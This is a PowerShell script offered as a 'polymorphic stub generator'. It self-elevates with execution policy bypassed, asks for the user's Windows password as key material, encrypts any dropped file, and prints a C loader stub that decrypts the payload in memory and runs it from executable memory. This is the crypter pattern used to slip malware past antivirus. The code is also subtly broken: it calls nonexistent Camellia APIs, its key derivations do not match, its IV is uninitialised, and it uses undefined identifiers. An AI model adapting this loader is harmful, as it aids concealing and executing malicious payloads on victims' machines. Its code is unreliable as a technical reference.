# CamDrop.ps1  —  public domain 2025
# Drag-and-drop ANY file onto THIS SCRIPT ICON → encrypted stub generator
param(
    [Parameter(Mandatory=$true)]
    [string]$Dropped
)

# ----------  helper: elevate if needed  ----------
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Dropped `"$Dropped`"" -Verb RunAs
    exit
}

# ----------  derive key/IV from user+machine+password (no storage)  ----------
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$sid = ([System.DirectoryServices.AccountManagement.PrincipalContext]::Machine).UserPrincipal.Sid.Value
$cred  = Get-Credential -Message "Enter YOUR Windows password (used as salt)" -User $env:USERNAME
$plain = $cred.GetNetworkCredential().Password
$salt  = [System.Text.Encoding]::UTF8.GetBytes($sid+$env:USERNAME+$plain)
$pbkdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($salt,$salt,1000)
$key   = $pbkdf.GetBytes(32)
$iv    = $pbkdf.GetBytes(16)

# ----------  encrypt file in memory  ----------
$in  = [System.IO.File]::ReadAllBytes($Dropped)
$mem = New-Object System.IO.MemoryStream
$alg = [System.Security.Cryptography.Camellia]::Create()
$alg.Key = $key
$alg.IV  = $iv
$alg.Mode = [System.Security.Cryptography.CipherMode]::CTR
$cs  = New-Object System.Security.Cryptography.CryptoStream($mem,$alg.CreateEncryptor(),[System.Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($in,0,$in.Length)
$cs.Close()
$b64 = [Convert]::ToBase64String($mem.ToArray())

# ----------  polymorphic stub generator  ----------
$stub = @"
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib,"advapi32.lib")
#define B64SZ $($b64.Length)
static const char blob[B64SZ+1]="$b64";
static void rnd(char*s,int n){for(int i=0;i<n;i++)s[i]='a'+(rand()%26);}
void main(void){
    char n1[16],n2[16],n3[16];srand((unsigned)time(NULL));rnd(n1,16);rnd(n2,16);rnd(n3,16);
    DWORD len=0;CryptStringToBinaryA(blob,0,CRYPT_STRING_BASE64,NULL,&len,NULL,NULL);
    BYTE*$(n1)=(BYTE*)HeapAlloc(GetProcessHeap(),0,len);
    CryptStringToBinaryA(blob,0,CRYPT_STRING_BASE64,$(n1),&len,NULL,NULL);
    HCRYPTPROV$(n2);CryptAcquireContextA(&$(n2),NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT);
    /* re-derive key/IV identical to dropper */
    wchar_t user[256],sid[256];DWORD u=256,s=256;
    GetUserNameW(user,&u);CreateWellKnownSid(WinAccountSid,NULL,(PSID)sid,&s);
    wchar_t pwd[256];CredUIPromptForCredentialsW(NULL,L"Re-enter password",user,0,pwd,256,NULL,0,0);
    BYTE salt[512];int i=0;for(;i<u*2;i++)salt[i]=((BYTE*)user)[i];
    for(int j=0;j<s;j++)salt[i++]=((BYTE*)sid)[j];
    for(int j=0;j<256;j++)salt[i++]=((BYTE*)pwd)[j];
    HCRYPTHASH hSalt;CryptCreateHash($(n2),CALG_SHA_256,0,0,&hSalt);
    CryptHashData(hSalt,salt,i,0);
    HCRYPTKEY$(n3);CryptDeriveKey($(n2),CALG_CAMELLIA,hSalt,CRYPT_EXPORTABLE,&$(n3));
    DWORD md=CRYPT_MODE_CTR;CryptSetKeyParam($(n3),KP_MODE,(BYTE*)&md,0);
    BYTE iv[16];CryptSetKeyParam($(n3),KP_IV,iv,0);
    CryptDecrypt($(n3),$(n3),TRUE,0,$(n1),&len);
    void*exe=VirtualAlloc(NULL,len,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    memcpy(exe,$(n1),len);((void(*)())exe)();
}
"@

# ----------  output only the stub  ----------
Write-Host "=== POLYMORPHIC STUB (no key needed) ==="
Write-Host $stub
